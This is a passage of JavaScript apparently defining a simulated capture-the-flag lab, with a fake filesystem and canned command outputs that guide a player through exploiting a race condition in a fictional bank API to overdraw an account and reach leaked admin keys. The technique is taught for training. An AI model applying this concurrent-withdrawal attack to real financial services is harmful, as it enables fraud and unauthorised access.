                                    content: 'Mar 25 14:20:00 txn-server systemd[1]: Started Meridian Federal Transaction Engine.\nMar 25 14:20:01 txn-server node[1823]: Meridian Federal API Gateway on :5000\nMar 25 14:20:02 txn-server python3[1847]: Transaction handler ready, PID 1847\nMar 25 14:25:44 txn-server python3[1847]: WARNING: concurrent access detected on accounts.json\nMar 25 14:25:44 txn-server kernel: [  344.201] python3[2091]: open("/var/lib/meridian/accounts.json", O_RDONLY) = 3\nMar 25 14:25:44 txn-server kernel: [  344.203] python3[2092]: open("/var/lib/meridian/accounts.json", O_RDONLY) = 3\nMar 25 14:25:44 txn-server kernel: [  344.248] python3[2091]: open("/var/lib/meridian/accounts.json", O_WRONLY|O_TRUNC) = 3\nMar 25 14:25:44 txn-server kernel: [  344.250] python3[2092]: open("/var/lib/meridian/accounts.json", O_WRONLY|O_TRUNC) = 3'
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'txn-server' },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\nanalyst:x:1000:1000:Security Analyst,,,:/home/analyst:/bin/bash\nmeridian:x:999:999:Meridian Service,,,:/var/lib/meridian:/usr/sbin/nologin'
                        },
                        'systemd': {
                            type: 'dir',
                            children: {
                                'system': {
                                    type: 'dir',
                                    children: {
                                        'meridian-txn.service': {
                                            type: 'file',
                                            content: '[Unit]\nDescription=Meridian Federal Transaction Engine\nAfter=network.target\n\n[Service]\nType=simple\nUser=meridian\nExecStart=/usr/bin/python3 /home/analyst/app/transaction_handler.py\nRestart=always\nRestartSec=3\n\n[Install]\nWantedBy=multi-user.target'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'bin': {
                            type: 'dir',
                            children: {}
                        }
                    }
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        'curl': function(args, term, engine) {
            const joined = args.join(' ');

            // curl http://localhost:5000/api/balance/<account>
            if (joined.includes('/api/balance/')) {
                const acctMatch = joined.match(/\/api\/balance\/(\S+)/);
                const acctId = acctMatch ? acctMatch[1] : 'MF-7291';

                const balances = {
                    'MF-7291': 3000,
                    'MF-4455': 2050,
                    'MF-0001': 50000
                };

                const bal = balances[acctId];
                if (bal !== undefined) {
                    return JSON.stringify({ account_id: acctId, balance: bal }, null, 2);
                }
                return JSON.stringify({ error: 'account_not_found' }, null, 2);
            }

            // curl POST /api/withdraw (single request)
            if (joined.includes('/api/withdraw') && (joined.includes('-X POST') || joined.includes('--data') || joined.includes('-d '))) {
                return JSON.stringify({
                    status: 'success',
                    new_balance: 2500,
                    note: 'Single request processed normally. To exploit the race condition, you need CONCURRENT requests. Try: race-runner --target http://localhost:5000/api/withdraw --threads 10 --amount 500'
                }, null, 2);
            }

            // curl /api/admin/master-keys (before exploit)
            if (joined.includes('/api/admin/master-keys') && !engine._raceExploited) {
                return JSON.stringify({ error: 'unauthorized' }, null, 2) + '\n\nHTTP/1.1 403 Forbidden\nThe admin endpoint requires debug mode.\nDebug mode activates when a negative balance is detected.\nYou need to exploit the race condition first.';
            }

            // curl /api/admin/master-keys (after exploit)
            if (joined.includes('/api/admin/master-keys') && engine._raceExploited) {
                engine.advancePhase && engine.advancePhase('privilege_escalation');
                return JSON.stringify({
                    status: 'DEBUG_MODE_ACTIVE',
                    reason: 'negative_balance_detected',
                    master_keys: {
                        aes256_master: 'b7e9c4f2a18d3605c9e7ab12df83910e4c2b7a6f',
                        hmac_signing: '9f3a7c1d5b82e04f6d19ca38e7201b5d8a4c6e9f',
                        flag: '{{FLAG:root}}'
                    }
                }, null, 2) + '\n\n[!] ADMIN ACCESS GRANTED -- DEBUG MODE\n[!] Negative balance on MF-7291 triggered auth bypass\n[!] Master encryption keys exposed';
            }

            // curl /api/withdraw without POST
            if (joined.includes('/api/withdraw') && !joined.includes('-X POST') && !joined.includes('--data') && !joined.includes('-d ')) {
                return 'HTTP/1.1 405 Method Not Allowed\n{"error": "Use POST method with JSON body: {account_id, amount}"}';
            }

            // Generic curl
            if (joined.includes('localhost') || joined.includes('127.0.0.1')) {
                return 'HTTP/1.1 200 OK\n\nMeridian Federal Transaction Engine v2.3.1\nEndpoints:\n  GET  /api/balance/<account_id>\n  POST /api/withdraw  {account_id, amount}\n  GET  /api/admin/master-keys  (requires admin auth)';
            }

            if (!joined || joined === '--help') {
                return 'Usage: curl [options] <url>\n\nCommon options:\n  -X METHOD    HTTP method (GET, POST, PUT, DELETE)\n  -d DATA      POST data\n  -H HEADER    Custom header\n  -v           Verbose output\n\nTry:\n  curl http://localhost:5000/api/balance/MF-7291\n  curl -X POST -d \'{"account_id":"MF-7291","amount":500}\' http://localhost:5000/api/withdraw';
            }

            return 'curl: Could not resolve host. This box has no external network.\nAvailable endpoints: http://localhost:5000/api/...';
        },

        'race-runner': function(args, term, engine) {
            const joined = args.join(' ');

            // race-runner --help
            if (!joined || joined === '--help' || joined === '-h') {
                return 'race-runner v1.0 -- Concurrent Request Race Condition Tool\n\nUsage:\n  race-runner --target <url> --threads <n> --amount <n>\n  race-runner --analyze <source_file>\n\nOptions:\n  --target URL       Target endpoint\n  --threads N        Number of concurrent requests (default: 10)\n  --amount N         Withdrawal amount per request (default: 500)\n  --delay MS         Delay between thread launches in ms (default: 0)\n  --analyze FILE     Analyze source code for TOCTOU patterns\n\nExamples:\n  race-runner --target http://localhost:5000/api/withdraw --threads 10 --amount 500\n  race-runner --analyze /home/analyst/app/transaction_handler.py';
            }

            // race-runner --analyze
            if (joined.includes('--analyze')) {
                engine.advancePhase && engine.advancePhase('analysis');
                return '[*] race-runner: Static Analysis Mode\n[*] Scanning: /home/analyst/app/transaction_handler.py\n\n' +
                    '=== TOCTOU VULNERABILITY DETECTED ===\n\n' +
                    'Location: transaction_handler.py, process_withdrawal()\n\n' +
                    '  Line 38:  balance = get_balance(account_id)     # TIME-OF-CHECK\n' +
                    '  Line 39:  if balance >= amount:                  # CHECK uses stale value\n' +
                    '  ...\n' +
                    '  Lines 48-49: _validate_compliance()              # +12ms delay\n' +
                    '               _notify_audit_subprocess()          # +35ms delay\n' +
                    '  ...\n' +
                    '  Line 52:  new_balance = balance - amount         # TIME-OF-USE\n' +
                    '  Line 53:  write_balance(account_id, new_balance) # WRITE (no lock)\n\n' +
                    'TOCTOU Window: ~47ms between CHECK (line 38) and USE (line 52)\n' +
                    'Root Cause:    No file locking on /var/lib/meridian/accounts.json\n' +
                    'Amplifier:     server.js spawns separate Python process per request\n' +
                    'Impact:        N concurrent requests can drain N * amount from\n' +
                    '               an account that only holds 1 * amount\n\n' +
                    'Severity: CRITICAL\n' +
                    'CWE-367: Time-of-Check Time-of-Use (TOCTOU) Race Condition\n\n' +
                    '{{FLAG:user}}';
            }

            // race-runner --target (the actual exploit)
            if (joined.includes('--target') && joined.includes('/api/withdraw')) {
                const threadsMatch = joined.match(/--threads\s+(\d+)/);
                const amountMatch = joined.match(/--amount\s+(\d+)/);
                const threads = threadsMatch ? parseInt(threadsMatch[1]) : 10;
                const amount = amountMatch ? parseInt(amountMatch[1]) : 500;
                const totalDrain = threads * amount;

                // Mark race as exploited for subsequent curl calls
                engine._raceExploited = true;
                engine.advancePhase && engine.advancePhase('exploitation');

                let output = '[*] race-runner v1.0 -- Concurrent Request Tool\n';
                output += `[*] Target:  http://localhost:5000/api/withdraw\n`;
                output += `[*] Threads: ${threads}\n`;
                output += `[*] Amount:  $${amount} per request\n`;
                output += `[*] Account: MF-7291 (balance: $3000)\n\n`;
                output += `[*] Spawning ${threads} threads...\n\n`;

                for (let i = 0; i < threads; i++) {
                    const staleBalance = 3000;
                    const newBal = staleBalance - amount;
                    output += `  Thread T-${i}: CHECK balance=$${staleBalance} >= $${amount}? YES -> DEDUCT -> bal=$${newBal}\n`;
                }

                const finalBalance = 3000 - totalDrain;
                output += '\n=== RACE CONDITION EXPLOITED ===\n\n';
                output += `  Threads completed:     ${threads}\n`;
                output += `  Amount per thread:     $${amount}\n`;
                output += `  Total drained:         $${totalDrain}\n`;
                output += `  Original balance:      $3000\n`;
                output += `  Expected final:        $${3000 - amount} (if atomic)\n`;
                output += `  Actual final balance:  $${finalBalance}\n\n`;

                if (finalBalance < 0) {
                    output += '  [!!!] NEGATIVE BALANCE DETECTED: $' + finalBalance + '\n';
                    output += '  [!!!] Debug mode activated on admin endpoint\n';
                    output += '  [!!!] Admin auth bypass triggered\n\n';
                    output += '  Next step: curl http://localhost:5000/api/admin/master-keys\n';
                } else {
                    output += '  [!] Balance is still positive. Try more threads or higher amount.\n';
                    output += '  [!] Need to push balance NEGATIVE to trigger admin auth bypass.\n';
                }

                return output;
            }

            return 'race-runner: invalid arguments. Use --help for usage.';
        },

        'strace': function(args, term, engine) {
            const joined = args.join(' ');

            if (!joined || joined === '--help') {
                return 'Usage: strace [options] -p <pid>\n       strace [options] <command>\n\nOptions:\n  -p PID     Attach to process\n  -e EXPR    Filter syscalls (e.g., -e open,read,write)\n  -t         Show timestamps\n  -T         Show time spent in syscalls\n  -f         Follow child processes\n\nRunning processes:\n  PID 1823   node (API gateway)\n  PID 1847   python3 (transaction handler)';
            }

            // strace -p 1847 (the transaction handler)
            if (joined.includes('1847') || joined.includes('transaction') || joined.includes('python')) {
                engine.advancePhase && engine.advancePhase('analysis');
                return 'strace: Process 1847 attached\n' +
                    '--- tracing python3 /home/analyst/app/transaction_handler.py ---\n\n' +
                    '14:25:44.201 open("/var/lib/meridian/accounts.json", O_RDONLY)  = 3    <0.001ms>\n' +
                    '14:25:44.201 read(3, "{\\"MF-7291\\":{\\"balance\\":3000...", 4096) = 287    <0.001ms>\n' +
                    '14:25:44.202 close(3)                                          = 0    <0.000ms>\n' +
                    '  ^^^ TIME-OF-CHECK: balance read as $3000\n\n' +
                    '14:25:44.205 write(4, "APPROVE|acct=MF-7291|...", 89)           = 89   <0.003ms>\n' +
                    '14:25:44.217 nanosleep({0, 12000000}, NULL)                     = 0    <12.1ms>\n' +
                    '  ^^^ _validate_compliance(): 12ms sleep\n\n' +
                    '14:25:44.229 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID) = 2091  <0.2ms>\n' +
                    '14:25:44.230 execve("/usr/bin/python3", ["python3", "audit_logger.py"]) = 0  <34.8ms>\n' +
                    '  ^^^ _notify_audit_subprocess(): fork+exec = 35ms\n\n' +
                    '  === TOCTOU WINDOW: 47ms total gap ===\n' +
                    '  === Another process can read stale balance during this gap ===\n\n' +
                    '14:25:44.248 open("/var/lib/meridian/accounts.json", O_WRONLY|O_TRUNC) = 3  <0.001ms>\n' +
                    '14:25:44.248 write(3, "{\\"MF-7291\\":{\\"balance\\":2500...", 291) = 291  <0.002ms>\n' +
                    '14:25:44.249 close(3)                                          = 0    <0.000ms>\n' +
                    '  ^^^ TIME-OF-USE: balance written as $2500 (NO LOCK)\n\n' +
                    '--- Detached from process 1847 ---\n\n' +
                    'SUMMARY:\n  Total CHECK->DEDUCT gap: 47ms\n  Syscalls in gap: nanosleep(12ms) + clone+execve(35ms)\n  File locking calls: NONE (no flock, no fcntl F_SETLK)\n  Vulnerability: CWE-367 TOCTOU confirmed';
            }

            // strace -p 1823 (the node gateway)
            if (joined.includes('1823') || joined.includes('node') || joined.includes('gateway')) {
                return 'strace: Process 1823 attached\n' +
                    '--- tracing node /home/analyst/app/server.js ---\n\n' +
                    'epoll_wait(5, [{EPOLLIN, {fd=6}}], 1024, -1) = 1\n' +
                    'accept4(6, {sa_family=AF_INET, sin_port=htons(42381)}, [16], SOCK_CLOEXEC|SOCK_NONBLOCK) = 7\n' +
                    'read(7, "POST /api/withdraw HTTP/1.1\\r\\n...", 65536) = 412\n' +
                    'clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID) = 2091\n' +
                    '  ^^^ Each POST spawns a new python3 process\n' +
                    '  ^^^ Multiple concurrent POSTs = multiple python3 processes\n' +
                    '  ^^^ Each reads the same stale balance file\n\n' +
                    '--- Detached from process 1823 ---';
            }

            return 'strace: must specify -p <pid> or a command.\nActive PIDs: 1823 (node gateway), 1847 (python3 txn handler)';
        },

        'ltrace': function(args, term, engine) {
            const joined = args.join(' ');

            if (!joined || joined === '--help') {
                return 'Usage: ltrace [options] -p <pid>\n\nOptions:\n  -p PID     Attach to process\n  -e EXPR    Filter library calls\n  -t         Show timestamps\n\nActive PIDs: 1823, 1847';
            }

            if (joined.includes('1847') || joined.includes('python')) {
                return 'ltrace: Process 1847 attached\n' +
                    '--- tracing library calls for python3 ---\n\n' +
                    'fopen("/var/lib/meridian/accounts.json", "r")                = 0x7f2a3c001a40\n' +
                    'json_loads(buf, 287)                                         = <dict at 0x7f2a3c002100>\n' +
                    'fclose(0x7f2a3c001a40)                                       = 0\n' +
                    '  ^^^ Balance read: no flock() called\n\n' +
                    'time_sleep(0.012)                                            = None\n' +
                    '  ^^^ _validate_compliance: 12ms gap\n\n' +
                    'subprocess_Popen(["python3", "audit_logger.py", ...])        = <Popen at 0x7f2a3c003200>\n' +
                    '  ^^^ Audit subprocess fork: ~35ms gap\n\n' +
                    'fopen("/var/lib/meridian/accounts.json", "w")                = 0x7f2a3c001a40\n' +
                    'json_dump(accounts, f)                                       = None\n' +
                    'fclose(0x7f2a3c001a40)                                       = 0\n' +
                    '  ^^^ Balance written: no flock() called\n' +
                    '  ^^^ O_TRUNC flag = entire file rewritten on each update\n\n' +
                    'Notable ABSENT calls:\n' +
                    '  flock()     -- NEVER called (file locking disabled)\n' +
                    '  fcntl()     -- NEVER called (no advisory locks)\n' +
                    '  lockf()     -- NEVER called\n\n' +
                    '--- Detached from process 1847 ---';
            }

            return 'ltrace: must specify -p <pid>.\nActive PIDs: 1823 (node), 1847 (python3)';
        },

        'ps': function(args) {
            const joined = args.join(' ');
            if (joined.includes('aux') || joined.includes('-ef') || joined.includes('-e')) {
                return 'USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n' +
                    'root         1  0.0  0.1  22368  2100 ?        Ss   14:19   0:00 /sbin/init\n' +
                    'root       312  0.0  0.1  15824  1580 ?        Ss   14:19   0:00 /usr/sbin/sshd\n' +
                    'meridian  1823  0.2  1.4 598432 28764 ?        Sl   14:20   0:03 node /home/analyst/app/server.js\n' +
                    'meridian  1847  0.1  0.8 234512 16384 ?        S    14:20   0:01 python3 /home/analyst/app/transaction_handler.py\n' +
                    'analyst   2044  0.0  0.2  23456  4096 pts/0    Ss   14:21   0:00 -bash\n' +
                    'analyst   2301  0.0  0.1  18232  2048 pts/0    R+   15:10   0:00 ps aux\n\n' +
                    'Note: PID 1823 (node) spawns a NEW python3 process for each incoming\n' +
                    'POST /api/withdraw request. Multiple concurrent requests = multiple\n' +
                    'python3 processes all reading the same accounts.json file.';
            }
            return 'Usage: ps [aux | -ef]\n\nTry: ps aux';
        },

        'top': function(args) {
            return 'top - 15:10:32 up  0:51,  1 user,  load average: 0.12, 0.08, 0.03\n' +
                'Tasks:  47 total,   1 running,  46 sleeping,   0 stopped,   0 zombie\n' +
                '%Cpu(s):  2.3 us,  0.7 sy,  0.0 ni, 96.8 id,  0.2 wa,  0.0 hi,  0.0 si\n' +
                'MiB Mem:  32768.0 total,  28412.3 free,   2156.7 used,   2199.0 buff/cache\n\n' +
                '  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n' +
                ' 1823 meridian  20   0  598432  28764  12456 S   0.3   0.1   0:03.12 node\n' +
                ' 1847 meridian  20   0  234512  16384   8192 S   0.1   0.0   0:01.44 python3\n' +
                '    1 root      20   0   22368   2100   1680 S   0.0   0.0   0:00.83 init\n' +
                '  312 root      20   0   15824   1580   1024 S   0.0   0.0   0:00.02 sshd\n' +
                ' 2044 analyst   20   0   23456   4096   3072 S   0.0   0.0   0:00.15 bash';
        },

        'python3': function(args, term, engine) {
            const joined = args.join(' ');

            if (joined.includes('timing_analyzer') || joined.includes('timing_analysis')) {
                engine.advancePhase && engine.advancePhase('analysis');
                return '[*] Analyzing /home/analyst/logs/transactions.log for TOCTOU patterns...\n\n' +
                    '  Total CHECK events:  7\n' +
                    '  Total DEDUCT events: 7\n' +
                    '  Average CHECK->DEDUCT gap: ~47ms\n\n' +
                    '  [!] TOCTOU WINDOW DETECTED\n' +
                    '  [!] Gap between balance read and write: 47ms\n' +
                    '  [!] Concurrent requests within this window\n' +
                    '      will read STALE balance values.\n\n' +
                    '  Exploit vector: Send N parallel requests\n' +
                    '  within the 47ms window. Each reads the same\n' +
                    '  balance, each passes the check, each deducts.\n' +
                    '  Net effect: N * amount withdrawn from a\n' +
                    '  single balance that only covers 1 * amount.';
            }

            if (joined.includes('exploit_template')) {
                engine._raceExploited = true;
                engine.advancePhase && engine.advancePhase('exploitation');
                return '[*] TOCTOU Race Condition Exploit\n' +
                    '[*] Target: http://localhost:5000/api/withdraw\n' +
                    '[*] Account: MF-7291\n' +
                    '[*] Amount per request: $500\n' +
                    '[*] Concurrent threads: 10\n' +
                    '[*] Expected drain: $5000 from $3000 balance\n\n' +
                    '[*] Launching 10 threads simultaneously...\n\n' +
                    '  Thread T-0: {"status": "success", "new_balance": 2500}\n' +
                    '  Thread T-1: {"status": "success", "new_balance": 2500}\n' +
                    '  Thread T-2: {"status": "success", "new_balance": 2500}\n' +
                    '  Thread T-3: {"status": "success", "new_balance": 2500}\n' +
                    '  Thread T-4: {"status": "success", "new_balance": 2500}\n' +
                    '  Thread T-5: {"status": "success", "new_balance": 2500}\n' +
                    '  Thread T-6: {"status": "success", "new_balance": 2500}\n' +
                    '  Thread T-7: {"status": "success", "new_balance": 2500}\n' +
                    '  Thread T-8: {"status": "success", "new_balance": 2500}\n' +
                    '  Thread T-9: {"status": "success", "new_balance": 2500}\n\n' +
                    '[*] Exploit complete.\n' +
                    '[*] All 10 threads read stale balance $3000\n' +
                    '[*] Each deducted $500 independently\n' +
                    '[*] Total drained: $5000\n' +
                    '[*] Final balance: $-2000 (NEGATIVE!)\n\n' +
                    '[!!!] NEGATIVE BALANCE DETECTED\n' +
                    '[!!!] Admin debug auth bypass triggered\n' +
                    '[!!!] Access: curl http://localhost:5000/api/admin/master-keys';
            }

            if (!joined || joined === '--version') {
                return 'Python 3.11.6\nUsage: python3 [-c cmd | script.py]\n\nAvailable scripts:\n  python3 /home/analyst/tools/timing_analyzer.py <logfile>\n  python3 /home/analyst/tools/exploit_template.py';
            }

            if (joined.includes('.py')) {
                return 'python3: can\'t open file \'' + joined + '\': [Errno 2] No such file or directory\nAvailable scripts:\n  /home/analyst/tools/timing_analyzer.py\n  /home/analyst/tools/exploit_template.py';
            }

            return 'Python 3.11.6\nUsage: python3 [-c cmd | script.py]';
        },

        'nmap': function(args) {
            if (args.length === 0) return 'Usage: nmap [options] <target>';
            const joined = args.join(' ');
            if (joined.includes('localhost') || joined.includes('127.0.0.1')) {
                return 'Starting Nmap 7.94\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.000023s latency).\n\nPORT     STATE SERVICE\n5000/tcp open  http     Meridian Federal API Gateway\n\nService detection performed.\nNmap done: 1 IP address (1 host up) scanned in 1.23 seconds';
            }
            return 'Starting Nmap 7.94\nNote: This box has no external network. Scan localhost:5000.';
        },

        'lsof': function(args) {
            const joined = args.join(' ');
            if (joined.includes('accounts.json') || joined.includes('/var/lib/meridian')) {
                return 'COMMAND    PID     USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME\npython3   1847 meridian    3r   REG    8,1      287 262147 /var/lib/meridian/accounts.json\n\nNote: FD "3r" = file descriptor 3, read-only\nNo LOCK column = no file locking active\nMultiple processes can open this file simultaneously without coordination.';
            }
            if (joined.includes('-i') || joined.includes(':5000')) {
                return 'COMMAND  PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nnode    1823 meridian   6u  IPv4  18234      0t0  TCP *:5000 (LISTEN)';
            }
            return 'Usage: lsof [options]\n  lsof -i :5000                  Show who is listening on port 5000\n  lsof /var/lib/meridian/accounts.json   Show who has the balance file open';
        },

        'flock': function(args) {
            return 'flock: /var/lib/meridian/accounts.json: Operation not permitted\n\nThe transaction handler does NOT use flock().\nThis is the core vulnerability -- no file locking means\nconcurrent processes can read/write accounts.json simultaneously.\n\nSee: cat /home/analyst/app/transaction_handler.py (lines 63-72)\nSee: cat /var/run/meridian-txn.lock (lock file exists but is NEVER checked)';
        },

        'systemctl': function(args) {
            const joined = args.join(' ');
            if (joined.includes('status') && joined.includes('meridian')) {
                return 'meridian-txn.service - Meridian Federal Transaction Engine\n   Loaded: loaded (/etc/systemd/system/meridian-txn.service; enabled)\n   Active: active (running) since Thu 2026-03-25 14:20:02 UTC; 55min ago\n Main PID: 1847 (python3)\n    Tasks: 2 (limit: 4096)\n   Memory: 16.4M\n   CGroup: /system.slice/meridian-txn.service\n           +-1847 python3 /home/analyst/app/transaction_handler.py\n\nMar 25 14:20:02 txn-server python3[1847]: Transaction handler ready, PID 1847\nMar 25 14:25:44 txn-server python3[1847]: WARNING: concurrent access detected';
            }
            return 'Usage: systemctl [status|start|stop|restart] <service>\nTry: systemctl status meridian-txn';
        },

        'file': function(args) {
            if (args.length === 0) return 'Usage: file <path>';
            const path = args[0];
            if (path.includes('accounts.json')) return '/var/lib/meridian/accounts.json: JSON text data, ASCII text';
            if (path.includes('transaction_handler')) return '/home/analyst/app/transaction_handler.py: Python script, ASCII text executable';
            if (path.includes('server.js')) return '/home/analyst/app/server.js: JavaScript source, ASCII text';
            if (path.includes('.pid')) return path + ': ASCII text (process ID file)';
            if (path.includes('.lock')) return path + ': ASCII text (lock file -- NOT ENFORCED)';
            return path + ': regular file';
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        return tmp.textContent.trim();
    }
};
